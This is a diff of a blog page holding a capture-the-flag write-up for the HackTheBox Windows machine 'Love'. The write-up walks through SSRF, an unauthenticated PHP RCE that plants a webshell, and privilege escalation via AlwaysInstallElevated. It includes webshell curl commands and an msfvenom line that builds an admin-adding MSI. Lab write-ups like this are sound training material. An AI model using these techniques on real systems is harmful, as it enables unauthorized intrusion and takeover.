@@ -1,168 +1,122 @@
 
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-  <meta name="HandheldFriendly" content="True" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <meta name="robots" content="" />
-
-  <link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&display=swap" rel="stylesheet">
-
-    <link rel="stylesheet" type="text/css" href="../../theme/stylesheet/style.min.css">
-
-    <link id="dark-theme-style" rel="stylesheet" type="text/css"
-          media="(prefers-color-scheme: dark)"
-    href="../../theme/stylesheet/dark-theme.min.css">
-
-    <link id="pygments-dark-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: dark)"
-          href="../../theme/pygments/monokai.min.css">
-    <link id="pygments-light-theme" rel="stylesheet" type="text/css"
-              media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)"
-          href="../../theme/pygments/sas.min.css">
-
-
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/fontawesome.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/brands.css">
-  <link rel="stylesheet" type="text/css" href="../../theme/font-awesome/css/solid.css">
-
-
-    <link href="https://maggick.fr/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="maggick's logs Atom">
-
-
-
-  
-
-
- 
-
-<meta name="author" content="maggick" />
-<meta name="description" content="This is a writeup about a retired HacktheBox machine: Love published on May 1 2021 by pwnmeow This box is classified as an easy machine. This box implies a SSRF, some php file and an AlwaysInstallElevated privilege on a Windows box." />
-<meta name="keywords" content="security, boot2root, HTB, windows, php, AlwaysInstallElevated">
-
-
-  <meta property="og:site_name" content="maggick's logs"/>
-  <meta property="og:title" content="HTB: Love"/>
-  <meta property="og:description" content="This is a writeup about a retired HacktheBox machine: Love published on May 1 2021 by pwnmeow This box is classified as an easy machine. This box implies a SSRF, some php file and an AlwaysInstallElevated privilege on a Windows box."/>
-  <meta property="og:locale" content="en_US"/>
-  <meta property="og:url" content="../../2021/08/htb-love.html"/>
-  <meta property="og:type" content="article"/>
-  <meta property="article:published_time" content="2021-08-09 17:55:00+02:00"/>
-  <meta property="article:modified_time" content=""/>
-  <meta property="article:author" content="../../author/maggick.html">
-  <meta property="article:section" content="security"/>
-  <meta property="article:tag" content="security"/>
-  <meta property="article:tag" content="boot2root"/>
-  <meta property="article:tag" content="HTB"/>
-  <meta property="article:tag" content="windows"/>
-  <meta property="article:tag" content="php"/>
-  <meta property="article:tag" content="AlwaysInstallElevated"/>
-  <meta property="og:image" content="https://maggick.fr/media/image.png">
-
-  <title>maggick's logs &ndash; HTB: Love</title>
-
-</head>
-<body >
-  <aside>
-    <div>
-      <a href="../../">
-        <img src="https://maggick.fr/media/image.png" alt="maggick's logs" title="maggick's logs">
-      </a>
-
-      <h1>
-        <a href="../../">maggick's logs</a>
-      </h1>
-
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+<meta content="" name="robots"/>
+<link href="https://fonts.googleapis.com/css2?family=Source+Code+Pro:ital,wght@0,400;0,700;1,400&amp;family=Source+Sans+Pro:ital,wght@0,300;0,400;0,700;1,400&amp;display=swap" rel="stylesheet"/>
+<link href="../../theme/stylesheet/style.min.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/stylesheet/dark-theme.min.css" id="dark-theme-style" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/monokai.min.css" id="pygments-dark-theme" media="(prefers-color-scheme: dark)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/pygments/sas.min.css" id="pygments-light-theme" media="(prefers-color-scheme: light), (prefers-color-scheme: no-preference)" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/fontawesome.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/brands.css" rel="stylesheet" type="text/css"/>
+<link href="../../theme/font-awesome/css/solid.css" rel="stylesheet" type="text/css"/>
+<link href="https://maggick.fr/feeds/all.atom.xml" rel="alternate" title="maggick's logs Atom" type="application/atom+xml"/>
+<meta content="maggick" name="author"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Love published on May 1 2021 by pwnmeow This box is classified as an easy machine. This box implies a SSRF, some php file and an AlwaysInstallElevated privilege on a Windows box." name="description"/>
+<meta content="security, boot2root, HTB, windows, php, AlwaysInstallElevated" name="keywords"/>
+<meta content="maggick's logs" property="og:site_name">
+<meta content="HTB: Love" property="og:title"/>
+<meta content="This is a writeup about a retired HacktheBox machine: Love published on May 1 2021 by pwnmeow This box is classified as an easy machine. This box implies a SSRF, some php file and an AlwaysInstallElevated privilege on a Windows box." property="og:description"/>
+<meta content="en_US" property="og:locale"/>
+<meta content="../../2021/08/htb-love.html" property="og:url"/>
+<meta content="article" property="og:type"/>
+<meta content="2021-08-09 17:55:00+02:00" property="article:published_time"/>
+<meta content="" property="article:modified_time"/>
+<meta content="../../author/maggick.html" property="article:author"/>
+<meta content="security" property="article:section">
+<meta content="security" property="article:tag"/>
+<meta content="boot2root" property="article:tag"/>
+<meta content="HTB" property="article:tag"/>
+<meta content="windows" property="article:tag"/>
+<meta content="php" property="article:tag"/>
+<meta content="AlwaysInstallElevated" property="article:tag"/>
+<meta content="https://maggick.fr/media/image.png" property="og:image"/>
+<title>maggick's logs – HTB: Love</title>
+</meta></meta></head>
+<body>
+<aside>
+<div>
+<a href="../../">
+<img alt="maggick's logs" src="https://maggick.fr/media/image.png" title="maggick's logs"/>
+</a>
+<h1>
+<a href="../../">maggick's logs</a>
+</h1>
 <p>Offensive security tales</p>
-
-      <nav>
-        <ul class="list">
-
-
-              <li>
-                <a target="_self"
-                   href="../../pages/about.html">
+<nav>
+<ul class="list">
+<li>
+<a href="../../pages/about.html" target="_self">
                   About
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/notes.html">
+</li>
+<li>
+<a href="../../pages/notes.html" target="_self">
                   Notes
                 </a>
-              </li>
-              <li>
-                <a target="_self"
-                   href="../../pages/tools.html">
+</li>
+<li>
+<a href="../../pages/tools.html" target="_self">
                   Tools
                 </a>
-              </li>
-
-        </ul>
-      </nav>
-
-      <ul class="social">
-          <li>
-            <a  class="sc-github" href="https://github.com/maggick" target="_blank">
-              <i class="fab fa-github"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
-              <i class="fab fa-twitter"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
-              <i class="fab fa-stack-overflow"></i>
-            </a>
-          </li>
-          <li>
-            <a  class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
-              <i class="fas fa-rss"></i>
-            </a>
-          </li>
-      </ul>
-    </div>
-
-  </aside>
-  <main>
-
-    <nav>
-      <a href="../../">Home</a>
-
-      <a href="/archives.html">Archives</a>
-      <a href="/categories.html">Categories</a>
-      <a href="/tags.html">Tags</a>
-
-      <a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
-
-    </nav>
-
+</li>
+</ul>
+</nav>
+<ul class="social">
+<li>
+<a class="sc-github" href="https://github.com/maggick" target="_blank">
+<i class="fab fa-github"></i>
+</a>
+</li>
+<li>
+<a class="sc-twitter" href="https://twitter.com/maggick_fr" target="_blank">
+<i class="fab fa-twitter"></i>
+</a>
+</li>
+<li>
+<a class="sc-stack-overflow" href="http://stackoverflow.com/users/1827067/maggick" target="_blank">
+<i class="fab fa-stack-overflow"></i>
+</a>
+</li>
+<li>
+<a class="sc-rss" href="https://maggick.fr/feeds/all.atom.xml" target="_blank">
+<i class="fas fa-rss"></i>
+</a>
+</li>
+</ul>
+</div>
+</aside>
+<main>
+<nav>
+<a href="../../">Home</a>
+<a href="/archives.html">Archives</a>
+<a href="/categories.html">Categories</a>
+<a href="/tags.html">Tags</a>
+<a href="https://maggick.fr/feeds/all.atom.xml">Atom</a>
+</nav>
 <article class="single">
-  <header>
-      
-    <h1 id="htb-love">HTB: Love</h1>
-    <p>
+<header>
+<h1 id="htb-love">HTB: Love</h1>
+<p>
       Posted on 09 Aug 2021 in <a href="../../category/security.html">security</a>
 
-        &#8226; 4 min read
+        • 4 min read
     </p>
-  </header>
-
-
-  <div>
-    <p><img class="align-left" src="/media/2021.08/love_card.png" alt="Love card" width="262"></p>
+</header>
+<div>
+<p><img alt="Love card" class="align-left" src="/media/2021.08/love_card.png" width="262"/></p>
 <p>This is a writeup about a retired HacktheBox machine:
 <a href="https://www.hackthebox.com/home/machines/profile/344">Love</a> published on
 May 1 2021 by
 <a href="https://www.hackthebox.com/home/users/profile/157669">pwnmeow</a>
 This box is classified as an easy machine. This box implies a SSRF, some php
 file and an AlwaysInstallElevated privilege on a Windows box.</p>
-
-
 <h1>User</h1>
 <h2>Recon</h2>
 <p>We start with an nmap scan. As always with Windows box a lot of ports are open.
@@ -194,7 +148,7 @@ PORT      STATE SERVICE      VERSION
 3306/tcp  open  mysql?
 | fingerprint-strings:
 |   DNSStatusRequestTCP, SIPOptions:
-|_    Host &#39;10.10.14.70&#39; is not allowed to connect to this MariaDB server
+|_    Host '10.10.14.70' is not allowed to connect to this MariaDB server
 5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
 |_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
 |_http-title: 403 Forbidden
@@ -224,22 +178,21 @@ PORT      STATE SERVICE      VERSION
 49670/tcp open  msrpc        Microsoft Windows RPC
 &lt;SNIP&gt;
 </code></pre></div>
-
 <h2>Web</h2>
 <p>On the port 80 we have a login form for a PHP voting system.</p>
 <p>On the port 443 we have a FileScanner with a demo. As pointed out by the <code>nmap</code> scan and the SSL
 certificate we need to use another domain <code>staging.love.htb</code></p>
-<p><img alt="love ssl certificate" src="/media/2021.08/love_01.png"></p>
+<p><img alt="love ssl certificate" class="image-process-article-image" src="/media/2021.08/derivatives/article-image/love_01.png"/></p>
 <p>Here we can input an URL to get it "scanned". After a few trial with our files (and a simple python server)
 scanned means echoed.</p>
 <p>Looking back at our <code>nmap</code> scan we can see that we are forbidden to access the webpage on port 5000.
 We use the scanner to display it. It contains the password for the voting system <code>@LoveIsInTheAir!!!!</code>.</p>
-<p><img alt="admin password for the voting system" src="/media/2021.08/love_02.png"></p>
+<p><img alt="admin password for the voting system" class="image-process-article-image" src="/media/2021.08/derivatives/article-image/love_02.png"/></p>
 <p>We connect to the voting system. There is a few vulnerabilities (one of them even unauthenticated Oo)
 Using the <a href="https://www.exploit-db.com/exploits/49445">(unauthenticated) RCE exploit</a> we can get a
 webshell by uploading <code>/usr/share/webshells/php/simple-backdoor.php</code> as an image for a candidate (after
 adding a position). We can then execute Windows command on the OS.</p>
-<div class="highlight"><pre><span></span><code>└─$ curl &#39;http://love.htb/images/simple-backdoor.php?cmd=whoami%20/all&#39;
+<div class="highlight"><pre><span></span><code>└─$ curl 'http://love.htb/images/simple-backdoor.php?cmd=whoami%20/all'
 &lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
 
 &lt;pre&gt;
@@ -280,23 +233,20 @@ SeUndockPrivilege             Remove computer from docking station Disabled
 SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
 SeTimeZonePrivilege           Change the time zone                 Disabled
 </code></pre></div>
-
 <p>We can grab the user flag on the way:</p>
-<div class="highlight"><pre><span></span><code>└─$ curl &#39;http://love.htb/images/simple-backdoor.php?cmd=type%20..\..\..\..\Users\Phoebe\Desktop\user.txt&#39;
+<div class="highlight"><pre><span></span><code>└─$ curl 'http://love.htb/images/simple-backdoor.php?cmd=type%20..\..\..\..\Users\Phoebe\Desktop\user.txt'
 &lt;!-- Simple PHP backdoor by DK (http://michaeldaw.org) --&gt;
 
 &lt;pre&gt;eb7553538ae21eec5e4d1d444beaf541
 &lt;/pre&gt;
 </code></pre></div>
-
 <h1>Root</h1>
 <p>We use the image upload function to put <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">WinPeas</a> on the box
 and we run it using our webshell. The output is quit huge (2344 lines).</p>
-<div class="highlight"><pre><span></span><code>└─$ curl &#39;http://love.htb/images/simple-backdoor.php?cmd=winPEASx64.exe&#39; &gt;&gt; winpeas_res
+<div class="highlight"><pre><span></span><code>└─$ curl 'http://love.htb/images/simple-backdoor.php?cmd=winPEASx64.exe' &gt;&gt; winpeas_res
 └─$ wc -l winpeas_res
 2344 winpeas_res
 </code></pre></div>
-
 <p>We see that the AlwaysInstallElevated registry keys are set to one both in HKLM
 and HKCU.</p>
 <div class="highlight"><pre><span></span><code>[+] Checking AlwaysInstallElevated
@@ -304,15 +254,13 @@ and HKCU.</p>
   AlwaysInstallElevated set to 1 in HKLM!
   AlwaysInstallElevated set to 1 in HKCU!
 </code></pre></div>
-
 <p>We use <code>msfvenom</code> to generate an msi file that will "install" a new admin user
 with a know password.</p>
 <div class="highlight"><pre><span></span><code>└─$ #msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi
 </code></pre></div>
-
 <p>We then connect to the box using
 <a href="https://github.com/Hackplayers/evil-winrm">evil-winrm</a> and grab the root flag.</p>
-<div class="highlight"><pre><span></span><code>└─$ evil-winrm -i love.htb -u rottenadmin -p &#39;P@ssword123!&#39;
+<div class="highlight"><pre><span></span><code>└─$ evil-winrm -i love.htb -u rottenadmin -p 'P@ssword123!'
 
 Evil-WinRM shell v2.4
 
@@ -321,7 +269,6 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\rottenadmin\Documents&gt; type ..\..\Administrator\Desktop\root.txt
 af2d13b1f523eed72cddf44b166c4601
 </code></pre></div>
-
 <h1>Wrapping up</h1>
 <p>Overall a nice box with a few rabbit hole (very OSCP like). I banged my head a
 few time as I did not notice the port 5000 403. Also the CVE used to get the RCE
@@ -329,63 +276,42 @@ is completely unauthenticated so a simple Google search "php voting system
 exploit" would have return the same exploit. Also the exploit date (May 7) seems to be
 posterior to the box publication (May 1) which is odd and maybe not the intended
 RCE way.</p>
-  </div>
-  <div class="tag-cloud">
-    <p>
-      <a href="../../tag/security.html">security</a>
-      <a href="../../tag/boot2root.html">boot2root</a>
-      <a href="../../tag/htb.html">HTB</a>
-      <a href="../../tag/windows.html">windows</a>
-      <a href="../../tag/php.html">php</a>
-      <a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
-    </p>
-  </div>
-
-
-  <div class="neighbors">
-    <a class="btn float-left" href="../../2021/08/htb-the-notebook.html" title="HTB: The Notebook">
-      <i class="fa fa-angle-left"></i> Previous Post
-    </a>
-    <a class="btn float-right" href="../../2021/08/htb-knife.html" title="HTB: Knife">
-      Next Post <i class="fa fa-angle-right"></i>
-    </a>
-  </div>
-
-
-
-</article>
-
-    <footer>
+</div>
+<div class="tag-cloud">
 <p>
-  &copy; 2022  - This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by/4.0/deed.en_US" target="_blank">Creative Commons Attribution</a>
+<a href="../../tag/security.html">security</a>
+<a href="../../tag/boot2root.html">boot2root</a>
+<a href="../../tag/htb.html">HTB</a>
+<a href="../../tag/windows.html">windows</a>
+<a href="../../tag/php.html">php</a>
+<a href="../../tag/alwaysinstallelevated.html">AlwaysInstallElevated</a>
+</p>
+</div>
+<div class="neighbors">
+<a class="btn float-left" href="../../2021/08/htb-the-notebook.html" title="HTB: The Notebook">
+<i class="fa fa-angle-left"></i> Previous Post
+    </a>
+<a class="btn float-right" href="../../2021/08/htb-knife.html" title="HTB: Knife">
+      Next Post <i class="fa fa-angle-right"></i>
+</a>
+</div>
+</article>
+<footer>
+<p>
+  © 2022  - This work is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/deed.en_US" rel="license" target="_blank">Creative Commons Attribution</a>
 </p>
 <p>
 Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a href="http://bit.ly/flex-pelican" target="_blank">Flex</a> theme
   <span class="footer-separator">|</span>
   Switch to the <a href="javascript:void(0)" onclick="theme.switch(`dark`)">dark</a> | <a href="javascript:void(0)" onclick="theme.switch(`light`)">light</a> | <a href="javascript:void(0)" onclick="theme.switch(`browser`)">browser</a> theme
-  <script id="dark-theme-script"
-          src="../../theme/dark-theme/dark-theme.min.js"
-          data-enable-auto-detect-theme="True"
-          data-default-theme="light"
-          type="text/javascript">
-  </script>
+  <script data-default-theme="light" data-enable-auto-detect-theme="True" id="dark-theme-script" src="../../theme/dark-theme/dark-theme.min.js" type="text/javascript">
+</script>
 </p><p>
-  <a rel="license"
-     href="http://creativecommons.org/licenses/by/4.0/"
-     target="_blank">
-    <img alt="Creative Commons License"
-         title="Creative Commons License"
-         style="border-width:0"
-           src="https://i.creativecommons.org/l/by/4.0/80x15.png"
-         width="80"
-         height="15"/>
-  </a>
-</p>    </footer>
-  </main>
-
-
-
-
+<a href="http://creativecommons.org/licenses/by/4.0/" rel="license" target="_blank">
+<img alt="Creative Commons License" height="15" src="https://i.creativecommons.org/l/by/4.0/80x15.png" style="border-width:0" title="Creative Commons License" width="80">
+</img></a>
+</p> </footer>
+</main>
 <script type="application/ld+json">
 {
   "@context" : "http://schema.org",
@@ -396,6 +322,5 @@ Built with <a href="http://getpelican.com" target="_blank">Pelican</a> using <a 
   "description": ""
 }
 </script>
-
 </body>
 </html>
